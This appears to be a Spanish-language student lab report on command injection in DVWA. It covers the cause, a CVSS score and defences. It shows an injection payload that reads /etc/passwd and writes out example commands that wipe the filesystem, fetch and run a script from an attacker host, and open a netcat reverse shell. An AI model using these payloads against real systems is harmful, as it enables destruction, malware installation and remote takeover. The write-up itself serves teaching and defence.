# Command Injection (Inyección de Comandos)

## 1. Evidencia

**Módulo DVWA:** Command Injection  
**Nivel de seguridad:** Low  
**Payload utilizado:** `127.0.0.1; cat /etc/passwd`  
**Captura:**

![Evidencia Command Injection](../img_johnic/comandos_johnic.png)

**Descripción:** Al ingresar el payload en el campo "Enter an IP address", la aplicación ejecutó primero el comando `ping 127.0.0.1` y luego, gracias al separador `;`, ejecutó `cat /etc/passwd`, exponiendo el contenido completo del archivo de usuarios del sistema operativo. Se obtuvieron entradas sensibles como `root`, `daemon`, `mysql` y otros usuarios del sistema.

---

## 2. ¿Por qué ocurre?

La vulnerabilidad existe porque la aplicación pasa el input del usuario directamente a una función de ejecución del sistema operativo (como `shell_exec()` o `exec()` en PHP) sin ningún tipo de validación ni sanitización. El separador `;` permite encadenar comandos arbitrarios al comando original previsto. En un escenario real, un atacante podría ejecutar comandos como:
## 127.0.0.1; rm -rf /

## 127.0.0.1; wget https://atacante.com/shell.sh | bash

## 127.0.0.1; nc -e /bin/bash atacante.com 4444
Permitiendo destrucción de datos, instalación de malware o apertura de una reverse shell con acceso total al servidor.

---

## 3. CVSS v3.1

**Vector:** `AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H`  
**Puntaje Base:** 10.0 — **Crítico**

| Métrica                    | Valor                  |
|----------------------------|------------------------|
| Vector de Ataque           | Red (Network)          |
| Complejidad del Ataque     | Baja (Low)             |
| Privilegios Requeridos     | Ninguno (None)         |
| Interacción del Usuario    | Ninguna (None)         |
| Alcance                    | Cambia (Changed)       |
| Confidencialidad           | Alto (High)            |
| Integridad                 | Alto (High)            |
| Disponibilidad             | Alto (High)            |

---

## 4. Defensa

- **Nunca pasar input del usuario al sistema operativo:** Evitar el uso de funciones como `exec()`, `shell_exec()`, `system()` o `passthru()` con datos provenientes del usuario.
- **Validación estricta de inputs:** Si el campo espera una IP, validar mediante expresión regular que el valor tenga exactamente el formato `x.x.x.x` antes de procesarlo.
- **Uso de APIs seguras:** Reemplazar llamadas al sistema por librerías nativas del lenguaje que realicen la misma función sin invocar una shell (por ejemplo, usar una librería de ping en lugar de ejecutar el comando).
- **Principio de mínimo privilegio:** Ejecutar el servidor web con un usuario del sistema con permisos mínimos, limitando el daño en caso de explotación.
- **WAF (Web Application Firewall):** Detectar y bloquear patrones de comandos peligrosos como `;`, `|`, `&&`, `||` y caracteres de escape en los inputs.